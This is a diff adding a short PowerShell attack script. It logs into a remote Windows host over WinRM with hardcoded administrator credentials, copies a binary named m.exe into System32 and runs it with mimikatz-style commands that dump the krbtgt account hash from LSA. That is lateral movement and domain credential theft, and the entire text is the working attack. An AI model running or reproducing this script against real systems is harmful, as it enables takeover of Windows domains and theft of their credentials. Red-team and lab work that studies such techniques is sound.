@@ -1,0 +1,9 @@
+. .\invoke-winrmsession.ps1;
+$session = invoke-winrmsession -Username "Administrator" -Password "Password123!" -IPAddress "192.0.2.20";
+Copy-Item m.exe -Destination "C:\Windows\System32\\" -ToSession $session -force;
+if ($?) {
+  write-host "[+] Successfully copied m.exe to remote host";
+} else {
+  write-host "[!] Error, copying and executing m.exe on remote host";
+}
+Invoke-Command -Session $session -scriptblock {C:\Windows\System32\m.exe privilege::debug "lsadump::lsa /inject /name:krbtgt" exit} | out-string
